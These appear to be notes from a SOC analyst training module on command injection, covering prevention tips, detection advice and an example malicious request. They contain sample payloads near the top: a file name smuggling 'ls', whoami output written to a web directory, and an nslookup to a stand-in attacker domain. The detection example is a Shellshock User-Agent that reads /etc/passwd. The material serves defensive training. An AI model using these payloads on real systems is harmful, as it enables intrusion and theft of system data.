
cp letsdefend;ls;.txt

& ping -c 10 127.0.0.1 &
& whoami > /var/www/static/whoami.txt &
& nslookup kgji2ohoyw.web-attacker.com &




-- How Attackers Leverage with Command Injection Attacks --

Attackers can execute commands on an operating system by exploiting command injection vulnerabilities. This means that the web application and all other components on the server are at risk.


-- How to Prevent Command Injection --

· Always sanitize data received from a user: Never trust data received from a user. Not even a file name!
· Limit user rights: Adjust web application user rights to a lower level whenever possible. Hardly any web application requires the user to have admin rights. 
· Make use of virtualization technologies such as dockers


-- Detecting Command Injection Attacks --

· When examining a web request look at all the areas: The command injection vulnerability may be located in various areas depending on the operation of the web application. This is why you should check all areas of the web request.
· Look for keywords related to the terminal language: Check the data received from the user for keywords that are related to terminal commands such as: dir, ls, cp, cat, type, etc.
· Familiarize yourself with frequently used Command Injection payloads: When attackers detect a command injection vulnerability they usually create a reverse shell in order to work more easily. This is why knowing frequently used Command Injection payloads will make it easier to detect a command injection attack .


-- Detection Example --

GET / HTTP/1.1
Host: yourcompany.com
User-Agent: () { :;}; echo "NS:" $(</etc/passwd)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close














